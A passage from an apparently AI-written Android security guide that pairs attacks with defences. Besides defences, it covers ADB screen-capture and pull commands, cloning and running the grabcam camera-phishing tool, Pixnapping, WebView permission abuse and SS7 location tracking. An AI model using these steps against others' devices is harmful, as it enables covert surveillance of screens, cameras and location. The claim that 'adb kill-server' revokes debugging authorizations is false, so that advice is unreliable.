      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Conditional Access: Policies should block access from untrusted locations or devices that show signs of compromise.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Phase 6: Detection and Hardening Tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 6.1: Static Analysis with MobSF</text:p>
      <text:p text:style-name="Preformatted_20_Text">Before even installing an app, a security team can scan it with MobSF (Mobile Security Framework) .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Run MobSF in a Docker container</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker pull opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Access the web UI at http://localhost:8000 and upload the APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># MobSF will generate a comprehensive report on permissions, code issues, and malware indicators.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Defense 6.2: Runtime Monitoring with Sandroid **</text:p>
      <text:p text:style-name="Preformatted_20_Text">For dynamic analysis, Sandroid (Dexray-Intercept) hooks into an app's behavior in real-time.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Profile all crypto and network activity of a suspicious app</text:p>
      <text:p text:style-name="Preformatted_20_Text">dexray-intercept --hooks-crypto --hooks-network com.suspicious.app.package</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># The tool will output detailed logs of every AES encryption, HTTP request, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Defense 6.3: System Hardening with SELinux Auditing **</text:p>
      <text:p text:style-name="Preformatted_20_Text">Check for actual permission violations on a live device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Defender's Command:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Enable full SELinux enforcement (it should be on by default)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell setenforce 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Monitor the logs for AVC (Access Vector Cache) denials</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>adb logcat | grep "avc: denied"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>Any output here shows a policy violation, which could be a malicious app trying to break out of its sandbox or a legitimate app with a bug.</text:p>
      <text:p text:style-name="Preformatted_20_Text">**Defense 6.4: The Ultimate On-Device Defense: Kali NetHunter **</text:p>
      <text:p text:style-name="Preformatted_20_Text">Paradoxically, one of the best ways to secure your own device is to turn it into a security testing platform. Kali NetHunter, installed on a rooted device with a custom kernel, gives you the power to audit your own network and test for the very attacks we've discussed.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User's Action: Install NetHunter on a compatible device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• NetHunter's Capabilities (Defensive Use):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Wi-Fi Monitoring: Use NetHunter's built-in tools to see if any "Evil Twin" access points are trying to lure your devices.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Traffic Inspection: Run tcpdump directly on the device to capture and analyze all network traffic, checking for suspicious outbound connections.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Exploit Prevention: By understanding how tools like EvilDroid work, a NetHunter user can better recognize the signs of compromise.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Conclusion</text:p>
      <text:p text:style-name="Preformatted_20_Text">This deep-dive demonstrates the cat-and-mouse game of Android security. The attacker's commands show a path of increasing sophistication: from simple ADB commands to exploit CVE-2024-0044 and CVE-2024-31317, gaining system privileges, and finally pivoting into the cloud. The defender's counter-commands show a multi-layered strategy: secure coding (manifest fixes, Keystore), system patching, runtime monitoring (Sandroid), static analysis (MobSF), and leveraging powerful platforms like Kali NetHunter for proactive defense. The command line is the ultimate tool for both sides of this battle.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Excellent question. The ability to surreptitiously capture a device's screen and camera represents one of the most critical threats to mobile privacy. These are not just theoretical risks; they are well-documented techniques used by real-world malware and are available in penetration testing frameworks .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Let's break this down into two clear sections: Screen Capture and Camera Access. For each, we will explore the attacker's methods and then the defender's countermeasures, using precise command-line implementations where applicable.</text:p>
      <text:p text:style-name="Preformatted_20_Text">A quick but crucial note: All the following commands are for educational purposes and authorized security testing only. Using them against devices you do not own is illegal.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Part 1: Screen Capture Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">An attacker wants to see exactly what you are seeing—your private messages, banking details, or one-time passwords. They have several methods to achieve this, each with its own level of sophistication.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 1.1: ADB-Based Screen Capture (Requires USB Debugging or Compromised ADB)</text:p>
      <text:p text:style-name="Preformatted_20_Text">If an attacker has already gained a foothold on your system (e.g., via malware) and your device has USB Debugging enabled, or if they can run ADB commands through a compromised computer you are connected to, they can directly capture your screen.</text:p>
      <text:p text:style-name="Preformatted_20_Text">The Attacker's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Check for Connected Devices: First, the attacker verifies a device is connected and authorized for ADB.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>adb devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>Output: This will list the device serial number with the status "device".</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Capture a Screenshot: The attacker uses the Android Debug Bridge to execute the screencap utility directly on the device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/># Take a screenshot and save it to the device's storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell screencap /sdcard/screen.png</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Pull (download) the file from the device to the attacker's machine</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb pull /sdcard/screen.png</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>Explanation: adb shell allows the attacker to run any Linux command on the Android device. screencap is a native Android tool that instantly captures the current screen and saves it as a PNG file .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Record a Screencast: For more dynamic information, the attacker can record a video of the screen.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/># Record the screen for 20 seconds at 720p resolution</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell screenrecord --size 720x1280 --time-limit 20 /sdcard/screen_video.mp4</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Pull the video file</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb pull /sdcard/screen_video.mp4</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.1: ADB Hardening and User Vigilance</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defending against ADB-based attacks relies on preventing the attacker from having ADB access in the first place.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Commands (on the device):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Disable USB Debugging: This is the single most important step. If USB Debugging is off, an attacker cannot use ADB commands unless they first trick the user into enabling it. Go to Settings &gt; Developer Options &gt; USB Debugging and ensure it is OFF. If you are a developer, only enable it when you are actively using it for development.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Revoke USB Debugging Authorizations: If you've ever connected your device to a computer, it may have been authorized. You can clear all authorizations to be safe.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># This command revokes all previously granted USB debugging permissions</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb kill-server</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On the device, you can also do this via: Settings &gt; Developer Options &gt; Revoke USB debugging authorizations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3. Monitor ADB Connections: On a rooted device, a security-conscious user could monitor for new ADB connections.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Check for any process listening on the ADB port (usually 5555)</text:p>
      <text:p text:style-name="Preformatted_20_Text">netstat -an | grep 5555</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 1.2: Malware-Based Screen Capture using MediaProjection and AccessibilityService</text:p>
      <text:p text:style-name="Preformatted_20_Text">More sophisticated malware doesn't need ADB. It can use legitimate Android APIs to capture the screen, often by tricking the user into granting permission or by abusing system services .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Malware's Technique:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ MediaProjection API: This is the official way for apps to record the screen. However, using it requires the app to display a system dialog prompt asking the user for permission. Malware tries to make this prompt look legitimate or appear at a time when the user is likely to click "Allow" .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ AccessibilityService Abuse: This is a far more dangerous vector. The AccessibilityService is designed to help users with disabilities by reading screen content and performing actions on their behalf. Malware can trick users into enabling this service for a malicious app. Once enabled, the app has extensive privileges, including the ability to read any text displayed on the screen and, in some cases, to capture its contents .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.2: Permission Auditing and App Vetting</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defending against API-based screen capture requires a combination of user awareness and technical controls.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Actions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Review Accessibility Service Settings: You should regularly check which apps have been granted Accessibility privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ User Command (on device): Go to Settings &gt; Accessibility &gt; Installed services. Scrutinize every app on this list. If you see an app you don't recognize or that shouldn't need this power (e.g., a simple flashlight app), turn it off immediately.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Be Wary of Screen Recording Prompts: When an app requests permission to <text:soft-page-break/>"record the screen," be extremely suspicious. Only grant this to trusted apps like video conferencing tools or screen recorders you intentionally installed.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3. Use Application Vetting Tools: For organizations or advanced users, tools like MobSF (Mobile Security Framework) can statically analyze an APK for dangerous permissions and API calls before installation .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Run MobSF in a Docker container to analyze a suspicious APK</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Then, upload the APK via the web UI at http://localhost:8000.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># MobSF will generate a report highlighting the use of MediaProjection or AccessibilityService.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 1.3: Advanced Side-Channel Attack - "Pixnapping" (CVE-2025-48561)</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is the most advanced and alarming category of screen capture. As detailed in research, "Pixnapping" allows a malicious app with no special permissions to reconstruct what is on the screen by exploiting how the Graphics Processing Unit (GPU) and display pipeline work .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Malware's Technique (Conceptual):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Target Invocation: The malicious app silently launches a target app (e.g., Google Authenticator) in the background using an Intent.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Pixel Isolation: It overlays a series of nearly transparent windows on top of the target app's hidden window. These windows are crafted to isolate a single pixel from the target app.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3. Side-Channel Leak: It exploits a known GPU vulnerability (like GPU.zip) to measure the time it takes to compress and render this complex stack of windows. This timing variation reveals the value of the isolated pixel.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>4. Reconstruction: By repeating this process for hundreds of pixels, the app can reconstruct an entire one-time password or other sensitive information in under 30 seconds .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 1.3: Apply Patches and Limit App Capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defending against attacks like Pixnapping is difficult because they exploit fundamental system design.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Actions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Apply Security Patches: The primary defense is for Google and device manufacturers (OEMs) to release patches. Google has partially addressed this, and a more complete fix was expected in the December 2025 security bulletin . Users must install these updates.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Limit Background Activity: A proactive defense for app developers is to hide sensitive content when their app goes into the background. This prevents the malicious app from targeting it, even if the side-channel exists . This is done programmatically within the app itself.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>// Example of a mitigation technique within an Android app (Kotlin/Java concept)</text:p>
      <text:p text:style-name="Preformatted_20_Text">// The app overrides the onPause() method to hide its sensitive views.</text:p>
      <text:p text:style-name="Preformatted_20_Text">override fun onPause() {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>super.onPause()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>// Hide all sensitive views (e.g., the text view showing a 2FA code)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sensitiveTextView.visibility = View.INVISIBLE</text:p>
      <text:p text:style-name="Preformatted_20_Text">}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">override fun onResume() {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>super.onResume()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>// Restore the views when the app is back in the foreground</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sensitiveTextView.visibility = View.VISIBLE</text:p>
      <text:p text:style-name="Preformatted_20_Text">}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Part 2: Camera Access Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Gaining unauthorized access to the camera is a direct invasion of physical privacy. Attackers use several methods, from simple social engineering to exploiting system vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.1: Social Engineering via Phishing Pages (e.g., Grabcam, CamSpy)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>This is a common, low-sophistication attack. Tools like grabcam or camspy create a malicious webpage that requests camera access under a false pretense (e.g., "You must allow camera to verify you are human") .</text:p>
      <text:p text:style-name="Preformatted_20_Text">The Attacker's Commands (using a tool like grabcam):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Clone and Run the Tool: The attacker downloads a script from GitHub.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>git clone https://github.com/D4XT/grabcam</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd grabcam</text:p>
      <text:p text:style-name="Preformatted_20_Text">bash grabcam.sh</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Select Port Forwarding: The tool presents a menu to select a port forwarding service (like ngrok or serveo) to make the local webpage accessible from the internet.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Send the Link: The tool generates a malicious link (e.g., http://something.ngrok.io). The attacker sends this link to the target via email, SMS, or social media, disguising it as a enticing offer or an important alert.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Victim Interaction: If the target clicks the link and grants camera permission when prompted by their browser, the webpage captures an image and sends it directly to the attacker's machine .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 2.1: Browser Security and Permission Awareness</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Actions:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Never Grant Camera Access to Suspicious Sites: Be extremely cautious when any website asks for camera permission. Legitimate sites that need your camera (like Zoom or a video chat site) will usually do so in a context you expect. An unknown link promising a free gift should never be trusted.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Check Browser Permissions: You can review which websites you have granted camera access to.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ On Chrome: Go to Settings &gt; Site settings &gt; Camera. Here you will see a list of sites that are allowed or blocked.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3. Use a Cover: For physical privacy, many people now use camera covers (physical sliders or stickers) on their laptops and phones. This is a 100% effective defense against any software-based camera access.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.2: Malware with Direct Camera Access (e.g., ShotDroid)</text:p>
      <text:p text:style-name="Preformatted_20_Text">More sophisticated malware, like ShotDroid, can be installed on a device and directly access the camera to capture photos or video . This often requires the malware to have the CAMERA permission declared in its manifest .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Malware's Manifest Entry:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>&lt;!-- In the malware's AndroidManifest.xml --&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;uses-permission android:name="android.permission.CAMERA" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/>Explanation: This line requests access to the camera. On modern Android, this is a "dangerous" permission, meaning the app must prompt the user at runtime. However, if the user is tricked into installing the app from outside the Play Store and grants the permission, the malware can then use the standard Android camera API to take pictures at will.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 2.2: Permission Auditing and App Vetting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Audit Installed App Permissions: Regularly review the permissions granted to your apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ User Command (on device): Go to Settings &gt; Apps &gt; See all apps. Select an app and tap Permissions. Revoke any permission that seems excessive. A simple calculator app should not have permission to access your camera.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. Use ADB to List Dangerous Permissions: For a more comprehensive audit, you can use ADB (with USB Debugging enabled for your own device) to list all apps that have been granted specific permissions.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># List all packages that have been granted the CAMERA permission</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell pm list packages -e -f | while read line; do</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>pkg=$(echo $line | cut -d: -f2 | cut -d= -f1)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if adb shell dumpsys package $pkg | grep -q "android.permission.CAMERA: granted=true"; then</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>echo "$pkg has camera permission"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>fi</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>done</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack 2.3: WebView Permission Inheritance Vulnerability</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is a more technical attack that abuses a flaw in how Android's WebView component handles permissions .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Malware's Technique:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1. Setup: A malicious app creates a WebView with specific, vulnerable settings (setSupportMultipleWindows(false) and no proper onCreateWindow handler).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2. First Page: It loads a first website in the WebView and tricks the user into granting camera access for that site.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3. Silent Navigation: It then uses JavaScript (window.open()) to load a second, malicious website. Because of the flawed settings, this new page loads in the same WebView.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>4. Permission Inheritance: The second, malicious website inherits the camera permission granted to the first site without prompting the user again .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense 2.3: Application Developer Responsibility</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is a vulnerability that must be fixed by app developers who use WebView.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Action (for Developers):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Properly Implement onCreateWindow: Any app using a WebView must properly override the WebChromeClient.onCreateWindow() method to handle new window requests securely, ensuring they are opened in a new, isolated WebView instance.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Keep System WebView Updated: Users should ensure that Android System WebView is updated via the Google Play Store, as it contains fixes for such vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Summary Table: Attack vs. Defense Commands</text:p>
      <text:p text:style-name="Preformatted_20_Text">Attack Vector<text:tab/>Attack Command/Technique<text:tab/>Defense Command/Action</text:p>
      <text:p text:style-name="Preformatted_20_Text">ADB Screen Capture<text:tab/>adb shell screencap /sdcard/screen.png<text:tab/>Disable USB Debugging in Settings</text:p>
      <text:p text:style-name="Preformatted_20_Text">ADB Screen Recording<text:tab/>adb shell screenrecord /sdcard/video.mp4<text:tab/>Revoke USB debugging authorizations</text:p>
      <text:p text:style-name="Preformatted_20_Text">AccessibilityService Abuse<text:tab/>Malware enables service via user trickery<text:tab/>Review Settings &gt; Accessibility &gt; Installed services</text:p>
      <text:p text:style-name="Preformatted_20_Text">Pixnapping (CVE-2025-48561)<text:tab/>No direct command; side-channel attack<text:tab/>Apply Android Security Patches (Dec 2025+)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Phishing Page (Grabcam)<text:tab/>bash grabcam.sh (attacker)<text:tab/>Never grant camera access to unknown sites</text:p>
      <text:p text:style-name="Preformatted_20_Text">Malware (ShotDroid)<text:tab/>Malware uses CAMERA permission<text:tab/>Audit permissions: adb shell dumpsys package ...</text:p>
      <text:p text:style-name="Preformatted_20_Text">WebView Vulnerability<text:tab/>Flawed app settings cause permission inheritance<text:tab/>Update Android System WebView via Play Store</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">In conclusion, the threats to your screen and camera are real and varied, ranging from simple social engineering to complex hardware side-channel attacks. The defense is equally multi-layered: it requires vigilance (checking permissions and links), technical hygiene (disabling ADB, applying patches), and for developers, secure coding practices (properly configuring WebViews and hiding sensitive content in the background).</text:p>
      <text:p text:style-name="Preformatted_20_Text">Excellent and important question. The short answer is yes, it is possible for sophisticated actors to determine your approximate location using only your phone number in Tanzania, and there are several ways this can happen. However, for an average person, it is not a simple task and requires access to specific systems or vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Based on the search results and technical knowledge, here is a detailed breakdown of how this can be done and the defenses available to you.</text:p>
      <text:p text:style-name="Preformatted_20_Text">📡 How Location Tracking by Phone Number Works</text:p>
      <text:p text:style-name="Preformatted_20_Text">There are three primary mechanisms through which your location can be tracked using just your phone number, ranging from low-tech to highly sophisticated.</text:p>
      <text:p text:style-name="Preformatted_20_Text">1. Mobile Network Operator (MNO) Infrastructure (Cell Tower Triangulation)</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is the most fundamental method. Your phone is constantly communicating with <text:soft-page-break/>cell towers to maintain network connectivity. This process, called Cell Tower Triangulation, happens automatically and is managed by your mobile network operator (like Vodacom, Airtel, or Tigo in Tanzania) .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works: Your phone sends out signals to find the best tower to connect to. The network measures the signal strength and the time it takes for the signal to travel between your phone and multiple nearby towers. By comparing this data from at least three towers, the carrier can estimate your device's location within a specific radius .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Who Can Access It: This level of location data is primarily accessible to the mobile network operator itself. As seen in reports from Tanzania, there have been serious allegations and legal cases where this data was shared with government agencies. For example, a former employee of Tigo's parent company testified in a British court that the company shared mobile phone data showing the location of opposition leader Tundu Lissu in the weeks before a 2017 assassination attempt on him . This demonstrates a real-world instance where phone number-linked location data was accessed and used.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2. Exploiting Global Telecom Vulnerabilities (SS7 Attacks)</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is a more advanced and concerning method that does not require cooperation from your local carrier. The global telecom network relies on a set of protocols called Signaling System No. 7 (SS7) . Unfortunately, SS7 was designed decades ago with trust, not security, in mind, and it has known vulnerabilities .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works: If a hacker or a sophisticated actor can gain access to the SS7 network, they can send specific queries using just your phone number. These queries can effectively ask the network for your current location, intercept your calls and text messages (including 2FA codes), and forward your calls .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Threat: This is a global issue, not limited to Tanzania. A cybersecurity professional in Tanzania noted that if bad actors exploit this vulnerability, it could become a massive threat to businesses and individuals in the country .</text:p>
      <text:p text:style-name="Preformatted_20_Text">3. Open-Source Intelligence (OSINT) and Public Databases</text:p>
      <text:p text:style-name="Preformatted_20_Text">This method relies on information that is, or can become, publicly available. It is less about "hacking" and more about "harvesting."</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Data Brokers: Your location data can be collected from various apps and services by data brokers, who then compile and sell this information. Mobile carriers have also been known to sell access to location data to these third-party aggregators .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Public Tools: Tools exist that can provide basic information linked to a phone number. For instance, a GitHub project called "J Phone NoTracker" claims to use the phonenumbers library and geolocation services to provide city-level coordinates for numbers, including Tanzanian numbers . While this tool likely relies on mapping the number's area code and prefix to a general location (like the city of the carrier's headquarters), it shows how easily accessible some information can be. Similarly, there are specific libraries created to identify Tanzanian mobile operators (like Vodacom, Airtel) based on a number's prefix . Knowing your carrier is the first step for more targeted attacks.</text:p>
      <text:p text:style-name="Preformatted_20_Text">🛡️ Defensive Measures: How to Protect Yourself</text:p>
      <text:p text:style-name="Preformatted_20_Text">While you cannot completely disappear from the grid without turning off your phone, you can take significant steps to make yourself much harder to track.</text:p>
      <text:p text:style-name="Preformatted_20_Text">1. Digital Hygiene and Device Settings</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Manage App Permissions: Regularly audit which apps have permission to access your location, microphone, and camera. Disable these permissions for any app that doesn't absolutely need them . On both Android and iOS, go into your Privacy or Location settings to do this.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Wi-Fi and Bluetooth Scanning: Even when Wi-Fi and Bluetooth are "off," your phone might still be scanning for networks and devices to improve location services. Go into your location settings and ensure Wi-Fi Scanning and Bluetooth Scanning are disabled .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Manage Your Advertising ID: Your phone has a unique advertising ID that advertisers use to track you across apps. On Android, you can delete this ID in the <text:soft-page-break/>"Ads" section of your settings. On iOS, you can turn off "Allow Apps to Request to Track" .</text:p>
      <text:p text:style-name="Preformatted_20_Text">2. Communication and Online Behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Encrypted Messaging Apps: For calls and messages, switch to apps that offer end-to-end encryption, such as Signal or WhatsApp . This prevents the content of your communication from being intercepted, even if someone is monitoring the SS7 network.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid SMS for Two-Factor Authentication (2FA): Given the vulnerability of SMS to SS7 attacks, use app-based authenticators like Google Authenticator, Authy, or hardware tokens like YubiKey for 2FA whenever possible .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use a VPN: A Virtual Private Network (VPN) hides your IP address, which can provide an approximate location to websites and services . Choose a reputable "no-log" VPN provider.</text:p>
      <text:p text:style-name="Preformatted_20_Text">3. Advanced and Physical Measures</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Nuclear Option: Airplane Mode or Power Off: The only way to completely stop your phone from communicating with cell towers is to put it in Airplane Mode or turn it off . This prevents triangulation, SS7 queries, and data collection. This is the most effective defense when you need absolute location privacy.</text:p>
